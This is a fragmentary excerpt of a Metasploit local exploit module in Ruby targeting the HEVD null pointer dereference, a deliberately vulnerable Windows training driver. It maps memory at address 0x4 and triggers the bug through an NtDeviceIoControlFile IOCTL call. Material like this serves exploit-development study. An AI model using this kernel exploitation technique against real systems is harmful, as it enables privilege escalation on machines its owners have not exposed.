...
class MetasploitModule < Msf::Exploit::Local
	...
	def initialize(info={})
		super(update_info(info, {
			'Name'              => 'HEVD NullPointerDereference',
	...
	def exploit
		...
		this_proc.memory.write(0x4, "\x00\x10\x00\x00")
		
		print_status("Triggering the vulnerability...")
		session.railgun.ntdll.NtDeviceIoControlFile(handle, nil, nil, nil, 4, 0x22202b, 0x1100, 0x4, 0, 0)
